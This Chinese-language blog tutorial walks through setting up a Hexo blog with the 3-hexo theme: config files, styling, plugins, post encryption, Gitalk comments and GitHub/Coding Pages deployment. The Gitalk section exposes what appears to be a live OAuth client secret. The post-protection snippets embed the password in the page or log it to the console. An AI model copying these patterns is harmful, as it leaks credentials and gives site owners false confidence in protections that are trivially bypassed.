106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125  # Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle:Mr.Framework #网站标题subtitle:\u0026#39;subtitle\u0026#39;#网站副标题description:\u0026#39;\u0026#39;#网站描述,主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词keywords:#网站的关键词,支持多个author:askDing #作者language:en #网站使用的语言timezone:\u0026#39;Asia/Shanghai\u0026#39;#时区，# URL## If your site is put in a subdirectory, set url as \u0026#39;http://example.com/child\u0026#39; and root as \u0026#39;/child/\u0026#39;url:https://askding.github.ioroot:/ # 网站根目录存放位置permalink::category/:title.html # 文章中的永久链接格式permalink_defaults:# 永久链接中的默认设置pretty_urls:trailing_index:true# Set to false to remove trailing \u0026#39;index.html\u0026#39; from permalinkstrailing_html:true# Set to false to remove trailing \u0026#39;.html\u0026#39; from permalinks# Directorysource_dir:source # 资源文件夹，存放内容的public_dir:public # 公共文件夹，用于存放生成的站点文件tag_dir:tags # 标签文件夹archive_dir:archives # 归档文件夹category_dir:categories # 分类文件夹code_dir:downloads/code # source_dir下的子目录,存放代码用的i18n_dir::lang # 国际化文件夹skip_render:# 跳过指定文件的渲染，匹配到文件将直接复制到public目录中# Writingnew_post_name::year-:month-:day-:title.md# File name of new postsdefault_layout:pagetitlecase:false# Transform title into titlecaseexternal_link:enable:true# Open external links in new tabfield:site# Apply to the whole siteexclude:\u0026#39;\u0026#39;filename_case:0render_drafts:falsepost_asset_folder:falserelative_link:falsefuture:truehighlight:enable:falseline_number:trueauto_detect:falsetab_replace:\u0026#39;\u0026#39;wrap:truehljs:falseprismjs:enable:falsepreprocess:trueline_number:truetab_replace:\u0026#39;\u0026#39;# Home page setting# path: Root path for your blogs index page. (default = \u0026#39;\u0026#39;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator:path:\u0026#39;\u0026#39;per_page:10order_by:-date# Category \u0026amp; Tagdefault_category:askDingcategory_map:tag_map:search:# 文章搜索path:search.xmlfield:_post# Metadata elements## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/metameta_generator:true# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format:YYYY-MM-DDtime_format:HH:mm:ss## updated_option supports \u0026#39;mtime\u0026#39;, \u0026#39;date\u0026#39;, \u0026#39;empty\u0026#39;updated_option:\u0026#39;date\u0026#39;# Pagination## Set per_page to 0 to disable paginationper_page:10pagination_dir:page# Include / Exclude file(s)## include:/exclude: options only apply to the \u0026#39;source/\u0026#39; folderinclude:exclude:ignore:# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme:3-hexo## Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:- hexo-generator-feed- hexo-generator-feed- hexo-generator-sitemap#Feed Atomfeed:type:atompath:atom.xmllimit:20# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:type:\u0026#39;git\u0026#39;repository:https://github.com/askDing/askDing.github.io.gitbranch:master  主题配置 hexo的主题仓库点击此处\n推荐的博客主题 3-hexo、Arknights 、 freemind.bithack\n Mr-Framework/themes/3-hexo/_config.yml\n 基础配置 UI颜色配置  Mr-Framework/themes/3-hexo/source/css/_partial/nav-right.styl\n 1 2 3 4 5 6 7 8 9 10 11 12 13  .nav-right width 420px height 100% background #F2F1D7 /* 柔黄色 */ border-right 1px solid #e5e8ec overflow hidden float left position relative -webkit-user-select none -moz-user-select none -ms-user-select none -o-user-select none user-select none    Mr-Framework/themes/3-hexo/source/css/_partial/post.styl\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  #post height 100% font-weight: 350; font-size: 14px; line-height 1.55 background #E8FFE8 /* 浅绿色 */ overflow-x hidden overflow-y auto -webkit-overflow-scrolling touch font-family -apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif color #2f2f2f margin-left 1px article padding 1em /* 内容间隔1em */ background #E8FFE8 .article-entry\u0026gt;p:nth-child(1) margin-top 20px .copyright margin-top 50px padding-bottom 30px background #E8FFE8 /* 版权浅绿色 */ line-height 14px text-align center color #BCC1C4   Gitalk评论背景颜色  /Mr-Framework/themes/3-hexo/source/css/_partial/comment.styl\n 1 2 3 4 5 6 7 8 9 10 11 12  #comments padding 2.5em background #e8ffe8 /* 评论区背景颜色 */ .comment-bar display block cursor pointer background rgba(255,255,255,0.3) padding 0.5rem -webkit-box-shadow 3px 2px 8px rgba(0,0,0,0.07) box-shadow 3px 2px 8px rgba(0,0,0,0.07) text-align center font-size 2rem   头像配置  图片存放在 Mr-Framework/themes/3-hexo/source/img/\n 1 2  avatar:/img/avatar.pngfavicon:/img/avatar.png  联系链接配置 1 2 3 4 5 6 7  ink:theme: color # 链接样式，color: 彩色图标 white:黑白图标items:rss:/atom.xmlgithub:https://github.com/askDingemail:askding@qq.comqq:741474596  文章分类设置 1 2 3 4 5 6 7  category:num:true# 分类显示文章数sub:true# 开启多级分类sort:- Cyber Security- aaa- bb  左下角自定义菜单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  menu:about:# \u0026#39;关于\u0026#39; 按钮on:true# 是否显示url:/about # 跳转链接type:1# 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页friend:# \u0026#39;友链\u0026#39; 按钮on:true# 是否展示menus:# 添加的其他菜单写在 menus 下，如下三个菜单：动态菜单1、动态菜单2、动态菜单3相册:on:falseurl:/phototype:1# 跳转类型 1：站内异步跳转叶落阁:on:falseurl:http://yelog.org/type:2# 跳转类型 2：当前页面跳转github:on:falseurl:https://github.com/yelogtype:3# 跳转类型 3：打开新的tab页  文末声明 1 2 3 4 5 6 7 8 9 10 11 12 13  # 文末声明article_txt:转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.combottom_text:©1996-2020 Mr.Framework# 自定义页面最下方的站点版权信息# 如果不填，则自定义为 ©2017 author (这个author为hexo根目录_config.yml中配置的)# 底部备案号miit:on:falseinfo:京ICP证030173号url:http://beian.miit.gov.cn/# 默认链接为 http://beian.miit.gov.cn/  左侧导航宽度  Mr-Framework/themes/3-hexo/source/css/_partial/nav-left.styl\n 1 2 3 4 5 6 7 8 9 10 11 12  .nav-left width 130px /* 左侧导航宽度 130px */ height 100% background #2A2935 box-shadow inset -15px 0 15px -15px #222 float left position relative -webkit-user-select none -moz-user-select none -ms-user-select none -o-user-select none user-select none   不蒜子网站计数配置 1 2 3 4 5 6 7  # 不蒜子网站计数设置# http://ibruce.info/2015/04/04/busuanzi/visit_counter:on:truesite_visit:truepage_visit:true  代码高亮配置  禁用网站配置文件里的代码高亮设置   Mr-Framework/_config.yml\n 1 2 3 4 5 6 7  highlight:enable:false/* 禁用代码高亮 */line_number:trueauto_detect:falsetab_replace:\u0026#39;\u0026#39;wrap:truehljs:false  启用主题配置文件里的代码高亮   Mr-Framework/themes/3-hexo/_config.yml\n 1 2 3 4 5  highlight:on:true# true开启代码高亮，开启需要关闭博客 _config.yml 中的 highlightlineNum:false# true显示行号copy:true# 复制功能theme:gruvbox-dark  高级配置 MathJax数学公式 修改 _config.yml\n1 2 3 4 5  # MathJax 数学公式支持mathjax:on:true#是否启用per_page: false # 若只渲染单个页面，此选项设为false，页面内加入 mathjax:trueyaml复制代码  考虑到页面的加载速度，支持渲染单个页面。\n设置 per_page: false ,在需要渲染的页面内 加入 mathjax: true\n 注意:\n由于hexo的MarkDown渲染器与MathJax有冲突，可能会造成矩阵等使用不正常。所以在使用之前需要修改两个地方\n编辑 node_modules\\marked\\lib\\marked.js 脚本\n  将451行 ，这一步取消了对 \\\\,\\{,\\} 的转义(escape)  1 2 3  escape: /^\\\\([\\\\`*{}\\[\\]()# +\\-.!_\u0026gt;])/, 改为 escape: /^\\\\([`*\\[\\]()# +\\-.!_\u0026gt;])/,   将459行，这一步取消了对斜体标记 _的转义  1 2 3  em: /^\\b_((?:[^_]|__)+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/, 改为 em:/^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/,   添加Mermaid图标 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;### # Mermaid 支持 mermaid: on: true cdn: //cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js #cdn: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.3.1/mermaid.min.js options: # 更多配置信息可以参考 https://mermaidjs.github.io/#/mermaidAPI theme: \u0026#39;default\u0026#39; startOnLoad: true flowchart: true useMaxWidth: false htmlLabels: true ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;命令行安装hexo-filter-mermaid-diagrams插件 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;### npm install hexo-filter-mermaid-diagrams   字数统计 1 2 3 4  word_count: false # true 开启字数统计 # 开启此功能需要安装插件 ：在 hexo根目录 执行 npm install hexo-wordcount   配置思维导图 1 2 3 4 5 6 7 8 9 10 11 12 13  npm install hexo-simple-mindmap # 安装思维导图插件 在markdown中按照如下格式输写 {% pullquote mindmap mindmap-md %} - [在 Hexo 中使用思维导图](https://hunterx.xyz/use-mindmap-in-hexo.html) - 前言 - 操作指南 - 准备需要的文件 - 为主题添加 CSS/JS 文件 - 使用方法 {% endpullquote %}   全文搜索 1 2 3 4 5 6 7 8 9  searchAll: ture # true 启用全文搜索 # 开启此功能需要下面操作： # 1. 在 hexo 根目录 执行 npm install hexo-generator-search --save 安装插件 # 2. 在 hexo 根目录的 _config.xml 中添加下面内容 # search: # path: search.xml # field: post npm install hexo-generator-search   添加RSS和Sitemap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ##\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;在网站配置文件中Mr-Framework/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;##### Plugins: http://hexo.io/plugins/#RSS订阅和sitemapplugin:- hexo-generator-feed- hexo-generator-sitemap#Feed Atomfeed:type:atompath:atom.xmllimit:20##### 在主题配置文件中Mr-Framework/themes/3-hexo/_config.yml添加如下内容 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;######link:theme: color # 链接样式，color: 彩色图标 white:黑白图标items:rss:/atom.xml  1  npm install hexo-generator-feed hexo-generator-sitemap   提交sitemap到Google站点平台\n下载这个html文件，到网站仓库上传这个html文件点击VERIFY\n添加站点文件sitemap.xml\n添加建站时间 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  \u0026lt;!-- 添加建站时间代码到Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs文件末尾 --\u0026gt; \u0026lt;script language=javascript\u0026gt; function siteTime() { window.setTimeout(\u0026#34;siteTime()\u0026#34;, 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; var today = new Date(); var todayYear = today.getFullYear(); var todayMonth = today.getMonth() + 1; var todayDate = today.getDate(); var todayHour = today.getHours(); var todayMinute = today.getMinutes(); var todaySecond = today.getSeconds(); /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳) year - 作为date对象的年份，为4位年份值 month - 0-11之间的整数，做为date对象的月份 day - 1-31之间的整数，做为date对象的天数 hours - 0(午夜24点)-23之间的整数，做为date对象的小时数 minutes - 0-59之间的整数，做为date对象的分钟数 seconds - 0-59之间的整数，做为date对象的秒数 microseconds - 0-999之间的整数，做为date对象的毫秒数 */ var t1 = Date.UTC(2020, 12, 05, 00, 00, 00); //北京时间2020-12-05 00:00:00  var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond); var diff = t2 - t1; var diffYears = Math.floor(diff / years); var diffDays = Math.floor((diff / days) - diffYears * 365); var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); document.getElementById(\u0026#34;sitetime\u0026#34;).innerHTML = \u0026#34;本站已运行 \u0026#34; +diffYears+\u0026#34; 年 \u0026#34;+diffDays + \u0026#34; 天 \u0026#34; + diffHours + \u0026#34; 小时 \u0026#34; + diffMinutes + \u0026#34; 分钟 \u0026#34; + diffSeconds + \u0026#34; 秒\u0026#34;; }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/ siteTime(); \u0026lt;/script\u0026gt;   然后在合适的地方（比如copyright声明后面）加上下面的代码就行了：\n Mr-Framework/themes/3-hexo/layout/indexs.md文件中添加如下代码\n 1  \u0026lt;span id=\u0026#34;sitetime\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;   添加百度统计和谷歌统计代码-不适用 打开themes/matery/layout/_partial/head.ejs，修改下面两行：\n1 2  \u0026lt;meta name=\u0026#34;baidu-site-verification\u0026#34; content=\u0026#34;fmlEuI34ir\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;google-site-verification\u0026#34; content=\u0026#34;yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48\u0026#34; /\u0026gt;   其中content内容改成你自己的就行了。\n图片添加水印-未适用 为了防止别人抄袭你文章，可以把所有的图片都加上水印，方法很简单。\n首先在博客根目录下新建一个watermark.py，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # -*- coding: utf-8 -*- import sys import glob from PIL import Image from PIL import ImageDraw from PIL import ImageFont def watermark(post_name): if post_name == \u0026#39;all\u0026#39;: post_name = \u0026#39;*\u0026#39; dir_name = \u0026#39;source/_posts/\u0026#39; + post_name + \u0026#39;/*\u0026#39; for files in glob.glob(dir_name): im = Image.open(files) if len(im.getbands()) \u0026lt; 3: im = im.convert(\u0026#39;RGB\u0026#39;) print(files) font = ImageFont.truetype(\u0026#39;STSONG.TTF\u0026#39;, max(30, int(im.size[1] / 20))) draw = ImageDraw.Draw(im) draw.text((im.size[0] / 2, im.size[1] / 2), u\u0026#39;@yourname\u0026#39;, fill=(0, 0, 0), font=font) im.save(files) if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) == 2: watermark(sys.argv[1]) else: print(\u0026#39;[usage] \u0026lt;input\u0026gt;\u0026#39;)   字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行python3 watermark.py postname添加水印，如果第一次运行要给所有文章添加水印，可以运行python3 watermark.py all。\n404页面  进入 Hexo 所在文件夹，输入 hexo new page 404 ; 打开刚新建的页面文件，默认在 Hexo 文件夹根目录下 /source/404/index.md； 在顶部插入一行，写上 permalink: /404，这表示指定该页固定链接为 http://\u0026quot;主页\u0026quot;/404.html  --- title: 404 permalink: /404 date: 2016-09-27 11:31:01 --- --- ## 页面未找到！ About/Resume页面  修改主题配置文件Mr-Framework/themes/3-hexo/source/config.yml\n 1 2 3 4 5 6 7 8  menu:about:# \u0026#39;关于\u0026#39; 按钮on:true# 是否显示url:/about # 跳转链接type:1# 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页# 在终端内运行hexo new page about #在source目录下创建/source/about/index.md 编辑index.md即可  添加音乐插件 生成外链代码 在网易云音乐 搜索一个作为背景音乐的歌曲，并进入播放页面，点击 生成外链播放器\n插入js脚本 给在第6步的外链代码进行优化如下，在**/Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs**末尾添加下列代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  \u0026lt;div id=\u0026#34;musicMouseDrag\u0026#34; style=\u0026#34;position:fixed; z-index: 9999; bottom: 0; right: 0;\u0026#34;\u0026gt; \u0026lt;!--默认style是底部bottom,右下角right --\u0026gt; \u0026lt;div id=\u0026#34;musicDragArea\u0026#34; style=\u0026#34;position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--网易云外链放在此处--\u0026gt; \u0026lt;iframe frameborder=\u0026#34;no\u0026#34; border=\u0026#34;0\u0026#34; marginwidth=\u0026#34;0\u0026#34; marginheight=\u0026#34;0\u0026#34; width=150 height=40 src=\u0026#34;//music.163.com/outchain/player?type=2\u0026amp;id=1373296\u0026amp;auto=1\u0026amp;height=32\u0026#34;\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--以下代码是为了支持随时拖动音乐控件的位置，如没有需求，可去掉下面代码--\u0026gt; \u0026lt;!--但是好像不能用 --\u0026gt; \u0026lt;script\u0026gt; var $DOC = $(document) $(\u0026#39;#musicMouseDrag\u0026#39;).on(\u0026#39;mousedown\u0026#39;, function (e) { // 阻止文本选中 $DOC.bind(\u0026#34;selectstart\u0026#34;, function () { return false; }); $(\u0026#39;#musicDragArea\u0026#39;).css(\u0026#39;height\u0026#39;, \u0026#39;100%\u0026#39;); var $moveTarget = $(\u0026#39;#musicMouseDrag\u0026#39;); $moveTarget.css(\u0026#39;border\u0026#39;, \u0026#39;1px dashed grey\u0026#39;) var div_x = e.pageX - $moveTarget.offset().left; var div_y = e.pageY - $moveTarget.offset().top; $DOC.on(\u0026#39;mousemove\u0026#39;, function (e) { var targetX = e.pageX - div_x; var targetY = e.pageY - div_y; targetX = targetX \u0026lt; 0 ? 0 : (targetX + $moveTarget.outerWidth() \u0026gt;= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX; targetY = targetY \u0026lt; 0 ? 0 : (targetY + $moveTarget.outerHeight() \u0026gt;= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY; $moveTarget.css({\u0026#39;left\u0026#39;: targetX + \u0026#39;px\u0026#39;, \u0026#39;top\u0026#39;: targetY + \u0026#39;px\u0026#39;, \u0026#39;bottom\u0026#39;: \u0026#39;inherit\u0026#39;, \u0026#39;right\u0026#39;: \u0026#39;inherit\u0026#39;}) }).on(\u0026#39;mouseup\u0026#39;, function () { $DOC.unbind(\u0026#34;selectstart\u0026#34;); $DOC.off(\u0026#39;mousemove\u0026#39;) $DOC.off(\u0026#39;mouseup\u0026#39;) $moveTarget.css(\u0026#39;border\u0026#39;, \u0026#39;none\u0026#39;) $(\u0026#39;#musicDragArea\u0026#39;).css(\u0026#39;height\u0026#39;, \u0026#39;10px\u0026#39;); }) }) \u0026lt;/script\u0026gt;   给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确 安装hexo-blog-encrypt插件 1  npm install hexo-blog-encrypt   网站根目录下的_config.yml文件配置，添加如下字段 1 2 3 4 5 6 7 8 9 10 11  # Securityencrypt:# hexo-blog-encryptabstract:有东西被加密了, 请输入密码查看.message:您好, 这里需要密码.tags:- {name: tagName, password:密码A}- {name: tagName, password:密码B}template:\u0026lt;div id=\u0026#34;hexo-blog-encrypt\u0026#34; data-wpm=\u0026#34;{{hbeWrongPassMessage}}\u0026#34; data-whm=\u0026#34;{{hbeWrongHashMessage}}\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;hbe-input-container\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;hbePass\u0026#34; placeholder=\u0026#34;{{hbeMessage}}\u0026#34; /\u0026gt;\u0026lt;label\u0026gt;{{hbeMessage}}\u0026lt;/label\u0026gt;\u0026lt;div class=\u0026#34;bottom-line\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script id=\u0026#34;hbeData\u0026#34; type=\u0026#34;hbeData\u0026#34; data-hmacdigest=\u0026#34;{{hbeHmacDigest}}\u0026#34;\u0026gt;{{hbeEncryptedData}}\u0026lt;/script\u0026gt;\u0026lt;/div\u0026gt;wrong_pass_message:抱歉, 这个密码看着不太对, 请再试试.wrong_hash_message:抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.silent:true# 禁用日志输出  博文front-matter配置 1 2 3 4 5 6 7 8 9 10 11  --- title: Hello World tags: - 作为日记加密 date: 2016-03-30 21:12:21 password: mikemessi abstract: 有东西被加密了, 请输入密码查看. message: 您好, 这里需要密码. wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试. wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容. ---   禁用tag加密🔐 1 2 3 4 5 6 7 8 9  --- title: Callback Test date: 2019-12-21 11:54:07 tags: - A Tag should be encrypted password: \u0026#34;\u0026#34; --- Use a \u0026#34;\u0026#34; to diable tag encryption.   禁用标签tag加密配置 在md文章中front-matter中设置如下\n1 2 3 4 5 6 7 8  ---title:Callback Testdate:2019-12-21 11:54:07tags:- A Tag should be encryptedpassword:\u0026#34;\u0026#34;---Use a \u0026#34;\u0026#34; to diable tag encryption.  给博文加密🔐-hexo-encrypt-正常配置 安装hex-encrypt 1  npm install hexo-encrypt # 安装hexo-encrypt依赖包   配置站点配置文件  Mr-Framework/_config.yml 新增如下字段\n 1 2  encrypt:password:123456# 默认密码  博文头部front-matter配置 1 2 3 4 5 6  --- encrypt: true enc_pwd: 123 --- enc_pwd不写，则是默认配置文件里的123456密码   加密界面微调 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  /*** Mr-Framework/node_modules/hexo-encrypt/lib/conf_post.js ***/ if (this.template == undefined || this.template == \u0026#39;\u0026#39;) { this.template = \u0026#39; \u0026lt;input id=\u0026#34;enc_pwd_input\u0026#34; type=\u0026#34;password\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;border-radius: 5px;\u0026#39; + \u0026#39;background-color: white;\u0026#39; + /* 密码输入框背景颜色 浅绿色 #E8FFE8 */ \u0026#39;border-style: groove;\u0026#39; + \u0026#39;height: 30px;\u0026#39; + \u0026#39;width: 50%;\u0026#39; + \u0026#39;cursor: auto;\u0026#39; + \u0026#39;font-size: 102%;\u0026#39; + \u0026#39;color: currentColor;\u0026#39; + /* 密文字体*的颜色 默认为currentColor */ \u0026#39;outline: none;\u0026#39; + \u0026#39;text-overflow: initial;\u0026#39; + \u0026#39;padding-left: 5px;\u0026#34; onkeydown=\u0026#34;if (event.keyCode == 13) { decrypt(); return false;}\u0026#34;\u0026gt; \u0026#39; + \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;解\u0026amp;nbsp;密\u0026#34; onclick=\u0026#34;decrypt()\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;width: 58px;\u0026#39; + \u0026#39;height: 34px;\u0026#39; + \u0026#39;border-radius: 5px;\u0026#39; + \u0026#39;background-color: #32414e;\u0026#39; + /* 提交按钮背景颜色 */ \u0026#39;border-style: solid;\u0026#39; + \u0026#39;color: white;\u0026#39; + /* 字体的颜色 默认为currentColor */ \u0026#39;\u0026#34;\u0026gt;\u0026#39; + \u0026#39;\u0026lt;div id=\u0026#34;enc_error\u0026#34; style=\u0026#34;\u0026#39; + \u0026#39;display: inline-block;\u0026#39; + \u0026#39;color: #d84527;\u0026#39; + \u0026#39;margin-left: 10px\u0026#39; + \u0026#39;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026#39; + \u0026#39;\u0026lt;script\u0026gt;\\n\u0026#39; + \u0026#39;var onError = function(error) {\\n\u0026#39; + \u0026#39;\tdocument.getElementById(\u0026#34;enc_error\u0026#34;).innerHTML = \u0026#34;password error!\u0026#34;\\n\u0026#39; + \u0026#39;};\\n\u0026#39; + \u0026#39;function decrypt() {\\n\u0026#39; + \u0026#39;var passwd = document.getElementById(\u0026#34;enc_pwd_input\u0026#34;).value;\\n\u0026#39; + \u0026#39;console.log(passwd);\\n\u0026#39; + \u0026#39;doDecrypt(passwd, onError);\\n\u0026#39; + \u0026#39;}\\n\u0026#39; + \u0026#39;\u0026lt;/script\u0026gt;\\n\u0026#39;; }   手动添加js代码实现博文加密加密 1 2 3 4 5 6 7 8 9 10 11 12  /* 在Mr-Framework/themes/3-hexo/layout/_partial/header.ejs末尾添加如下js脚本 */ #JavaScript \u0026lt;script\u0026gt; (function(){ if(\u0026#39;{{ page.password }}\u0026#39;){ if (prompt(\u0026#39;请输入密码\u0026#39;) !== \u0026#39;{{ page.password }}\u0026#39;){ alert(\u0026#39;密码错误\u0026#39;); history.back(); } } })(); \u0026lt;/script\u0026gt;   评论系统gitalk配置 注册OAuth Application 点击此处 来注册一个新的 OAuth Application。\n修改主题配置文件  /Mr-Framework/themes/3-hexo/_config.yml\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ##########评论设置#############comment:on:truetype:gitalk # 评论系统：gitalk、disqus、gitment、utteranc、livere,注意：使用时，在下方对应位置进行配置comment_count:true# 文章标题下方显示评论数 目前仅支持 gitalk 和 disqus## 使用说明 https://yelog.org//2020/05/23/3-hexo-comment/# 各评论系统配置 ↓↓gitalk:githubID: askDing # githubID:github用户名repo: askDing.github.io # repo:使用哪个仓库的issueClientID:3675559917bdc294608c # 创建 OAuth application 就会生成：ClientSecret:a826e0ded6d8b29a5bb77843f4c3805ecf7b263f # 创建 OAuth application 就会生成adminUser:askDing# 使用自己的 github 用户名即可 distractionFreeMode:true# 全屏遮罩效果language:zh-CN # 支持：en / zh-CN / zh-TW 三种perPage:10# 每次加载的数据大小，默认10，最大100  1  npm install gitalk # 安装gitalk模块   更多评论配置请查看叶落阁\n部署 Github部署 配置deploy 1 2 3 4 5 6  # Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:type:\u0026#39;git\u0026#39;repository:https://github.com/askDing/askDing.github.io.gitbranch:master  1 2  npm install hexo-deployer-git. # 安装git部署插件 hexo d # 部署到github   备份博客 1 2 3 4 5 6 7  cd Mr-Framework \u0026amp;\u0026amp; git init #进入博客目录并初始化git git remote add origin https://github.com/askDing/Mr.Framework.git # 添加远程git仓库 git add . \u0026amp;\u0026amp; git commit -m \u0026#34;My Blog Backup\u0026#34; # 初次提交到本地暂缓区 git push --set-upstream origin master # 设置上游分支 git push origin master # 上传到Github hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -m \u0026#34; `date` \u0026#34; \u0026amp;\u0026amp; git push -f # 部署到Github并进行备份   快捷命令  在.zshrc中添加\n 1 2  alias hs=\u0026#39;cd ~/Mr-Framework \u0026amp;\u0026amp; hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo s\u0026#39; # 启动本地服务 alias hdb=\u0026#39;cd ~/Mr-Framework \u0026amp;\u0026amp; hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -m \u0026#34; Mr.Framework updated: `date` \u0026#34; \u0026amp;\u0026amp; git push -f\u0026#39; # 部署到Github并进行备份   Coding部署-1 5. 开启coding pages服务，绑定域名\n如图：\n6. 阿里云添加解析\n这个时候就可以把之前github的解析改成境外，把coding的解析设为默认了。\n7. 去除coding page的跳转广告\ncoding page的一个比较恶心人的地方就是，你只是银牌会员的话，访问会先跳转到一个广告，再到你自己的域名。那么它也给出了消除的办法。右上角切换到coding的旧版界面，默认新版是不行的。然后再来到pages服务这里。\n这里：\n只要你在页面上添加一行文字，写Hosted by Coding Pages，然后点下面的小勾勾，两个工作日内它就会审核通过了。\n1  \u0026lt;p\u0026gt;Hosted by \u0026lt;a href=\u0026#34;https://pages.coding.me\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Coding Pages\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;   我的选择是把这一行代码放在主题文件夹/layout/common/footer.ejs里面，也就是本来在页面中看到的页脚部分。\n当然，为了统一，我又在后面加上了and Github哈哈，可以不加。\n1  \u0026lt;p\u0026gt;\u0026lt;span\u0026gt;Hosted by \u0026lt;a href=\u0026#34;https://pages.coding.me\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Coding Pages\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; and \u0026lt;span\u0026gt;\u0026lt;a href=\u0026#34;https://github.com\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Github\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;   这是最终加上去的代码。\n Markdown编辑器配置-Typora Preferences   General\n On Lauch \u0026gt;open custom folder set source of the hexo blog folder Save \u0026amp; Recover \u0026gt; ☑️ Save without asking when switch files on side panel    Apperarance\n Font Size \u0026gt; ☑️ Auto Themes 